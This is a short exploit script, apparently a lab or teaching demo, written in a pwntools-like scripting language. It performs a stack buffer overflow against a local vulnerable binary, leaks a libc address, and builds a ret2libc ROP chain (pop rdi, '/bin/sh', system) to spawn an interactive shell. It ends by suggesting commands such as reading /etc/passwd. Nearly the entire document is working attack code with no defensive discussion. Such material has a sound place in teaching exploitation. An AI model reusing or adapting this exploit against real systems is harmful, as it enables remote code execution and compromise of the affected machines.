# Buffer Overflow with ROP Chain
# This script demonstrates a classic buffer overflow exploitation using Return-Oriented Programming

print("[*] Buffer Overflow Exploit - ROP Chain")
print("============================================================")

let target_host = "127.0.0.1"
let target_port = 9999
let binary_path = "./vuln_binary"

print("[+] Target: " + target_host + ":" + str(target_port))
print("[+] Binary: " + binary_path)

# Step 1: Analyze binary protections
print("\n[*] Step 1: Analyzing binary protections...")
let protections = checksec(binary_path)
print("    NX: " + str(protections["nx"]))
print("    PIE: " + str(protections["pie"]))
print("    RELRO: " + protections["relro"])
print("    Stack Canary: " + str(protections["canary"]))

# Step 2: Find crash offset using cyclic pattern
print("\n[*] Step 2: Finding crash offset...")
let pattern_size = 1000
let pattern = cyclic(pattern_size)
print("    Generated cyclic pattern of size: " + str(pattern_size))

# Simulate sending pattern and finding offset
# In real scenario: let crash_offset = cyclic_find(pattern, crashed_eip)
let crash_offset = 264
print("    [!] Crash offset found: " + str(crash_offset))

# Step 3: Leak libc base address
print("\n[*] Step 3: Leaking libc base address...")
let session = connect(target_host, target_port)
let puts_addr = leak_address(session, "puts")
print("    Leaked puts @ " + hex(puts_addr))

# Calculate libc base dynamically using Libc object
let libc_template = Libc("ubuntu20.04")
let puts_offset = libc_template["symbols"]["puts"]
let libc_base = puts_addr - puts_offset
print("    Calculated libc base @ " + hex(libc_base))

# Step 4: Build ROP chain with dynamic address resolution
print("\n[*] Step 4: Building ROP chain...")
let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
let system_addr = libc_resolved["symbols"]["system"]
let binsh_addr = libc_resolved["strings"]["bin_sh"]
let pop_rdi = libc_base + 0x02164f  # pop rdi; ret
let ret = libc_base + 0x00001016      # ret (for stack alignment)

print("    system() @ " + hex(system_addr))
print("    /bin/sh @ " + hex(binsh_addr))
print("    pop rdi @ " + hex(pop_rdi))

# ROP chain: pop rdi; ret -> /bin/sh -> ret -> system()
let rop_chain = [
    pop_rdi,
    binsh_addr,
    ret,
    system_addr
]

# Step 5: Construct final payload
print("\n[*] Step 5: Constructing payload...")
let padding = cyclic(crash_offset)
let payload = padding

for gadget in rop_chain
    payload = payload + p64(gadget)
end

print("    Payload size: " + str(len(payload)) + " bytes")

# Step 6: Send exploit and get shell
print("\n[*] Step 6: Sending exploit...")
send(session, payload)
print("[+] Exploit sent!")

print("\n[*] Attempting to spawn interactive shell...")
print("[*] Try commands: whoami, id, cat /etc/passwd")
interactive(session)

print("\n[+] Exploit completed successfully!")
